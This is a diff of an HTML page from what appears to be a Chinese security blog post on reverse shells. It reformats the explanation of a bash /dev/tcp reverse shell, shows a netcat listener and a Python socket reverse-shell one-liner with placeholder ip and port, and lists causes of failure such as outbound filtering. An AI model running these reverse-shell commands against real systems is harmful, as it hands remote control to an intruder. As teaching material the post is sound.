@@ -384,7 +384,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-12-07
+                    2021-12-08
                 </div>
                 
 
@@ -427,7 +427,14 @@
 <p>开启监听端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>
 <p>受害机上使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">解释：</span><br><span class="line">bash -i代表在本地打开一个bash</span><br><span class="line">然后就是&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port， &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">&gt;&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br><span class="line">加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<ul>
+<li>bash -i代表在本地打开一个bash</li>
+<li>/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</li>
+<li>&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</li>
+<li>加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</li>
+</ul>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623305370591-81a7de94-5ef7-4df9-afb8-ca230297e390.png" alt="img"></p>
 <h3 id="python-反弹"><a href="#python-反弹" class="headerlink" title="python 反弹"></a>python 反弹</h3><p>反弹shell的命令变为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
@@ -489,6 +496,7 @@
 <li>禁止出站端口（只允许访问特定端口）</li>
 <li>禁止出站协议(只允许特定协议，如icmp、dns、http)</li>
 <li>反弹命令不存在或是当前用户无权调用bash</li>
+<li>可能不是使用的bash、而是sh或其他</li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/105906432">反弹shell失败的几种原因</a></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
@@ -892,7 +900,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">38.2k</span>&nbsp;字
+                class="white-color">39.4k</span>&nbsp;字
             
             
             
